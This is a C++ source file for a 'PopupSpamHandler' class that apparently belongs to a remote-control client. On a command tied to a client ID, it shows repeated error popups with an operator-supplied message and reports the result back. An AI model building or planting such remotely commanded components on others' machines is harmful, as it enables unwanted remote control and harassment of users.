#include <Windows.h>

#include "CommandHandlers/PopupSpamHandler.h"
#include "Commands/PopupCommand.h"
#include "Windows/WinUtils.h"
#include "Protocol/ReturnProductRequest.h"
#include "Products/PopupProduct.h"
using namespace xp_collector;

PopupSpamHandler::PopupSpamHandler(std::string client_id)
	: ICommandHandler(std::move(client_id))
{
}

std::unique_ptr<IRequest> PopupSpamHandler::handle(std::shared_ptr<BasicCommand>& command)
{
	const std::shared_ptr<PopupCommand> popup_command = std::static_pointer_cast<PopupCommand>(command);
	windows::do_popups(POPUPS_COUNT, "Popup", popup_command->get_message(), MB_ICONERROR);
	return std::make_unique<ReturnProductRequest>(
		RequestHeader{RequestType::ReturnProduct, m_client_id},
		std::make_unique<PopupProduct>(command->get_command_id(), true)
	);
}
